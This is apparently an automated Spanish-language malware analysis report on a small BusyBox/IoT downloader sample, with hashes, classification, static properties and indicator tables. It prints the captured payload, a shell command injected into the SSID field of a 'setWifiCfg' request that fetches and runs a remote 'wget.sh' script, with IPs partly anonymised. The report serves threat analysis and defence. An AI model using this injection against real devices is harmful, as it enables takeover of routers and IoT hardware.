# 🧬 Payload Analysis

`ebfd1a9cb0ce86a27f267b73b6a96d3d816e25a467e0d01e4c626d9a431a4872`

## 📌 Resumen

Texto ASCII de 350 B. La evidencia disponible identifica capacidad de descarga remota. Recurso remoto principal: `wget.sh` en `hxxp://91.92.40.XXX/wget.sh`. **Comandos observados o extraídos, en orden de aparición en la evidencia:**

1. `chmod`
2. `rm -f .s`
3. `wget hxxp://91.92.40.XXX/wget.sh -O .s`
4. `busybox wget hxxp://91.92.40.XXX` Los comandos se presentan como evidencia observada o extraída; no se afirma ejecución salvo que la relación registrada sea `executed`. **Perfil técnico:** `Linux / BusyBox`, compatible con sistemas embebidos o IoT. BusyBox se trata como indicio de plataforma y no como prueba suficiente de que el dispositivo sea IoT. **Ficha malware:** [malware-like/oraculo/downloader/ebfd1a9cb0ce86a27f267b73b6a96d3d816e25a467e0d01e4c626d9a431a4872.md](../../../../../malware-like/oraculo/downloader/ebfd1a9cb0ce86a27f267b73b6a96d3d816e25a467e0d01e4c626d9a431a4872.md)


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:51:31.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `ebfd1a9cb0ce86a27f267b73b6a96d3d816e25a467e0d01e4c626d9a431a4872`
- **SHA1:** `6b08de6028269c0d679a0dcfb95dde00273c96b5`
- **MD5:** `68d8e14a36e1762dae8617dcf45101ca`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 350 B |
| Entropía | 5.15 |
| Strings | 6 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Ejecución**
3. **Limpieza**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with CRLF line terminators; iocs=6

## 🖥️ Comandos observados / extraídos

```text
{"command":"setWifiCfg","ssid":"cd /tmp;rm -f .s;wget hxxp://91.92.40.XXX/wget.sh -O .s;busybox wget hxxp://91.92.40.XXX
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://91.92.40.XXX/wget.sh | strings |
| url | hxxp://91.92.40.XXX/wget.sh;chmod | strings |
| ip | 91.92.40.XXX | static_analysis |
| ip | 190.179.169.XXX | static_analysis |
| command | {"command":"setWifiCfg","ssid":"cd /tmp;rm -f .s;wget hxxp://91.92.40.XXX/wget.sh -O .s;busybox wget hxxp://91.92.40.XXX | strings |
| hash | ebfd1a9cb0ce86a27f267b73b6a96d3d816e25a467e0d01e4c626d9a431a4872 | static_analysis |
| ip | 45.153.34.XXX | artifact_source |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | low interest unknown |
| Prioridad | low |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
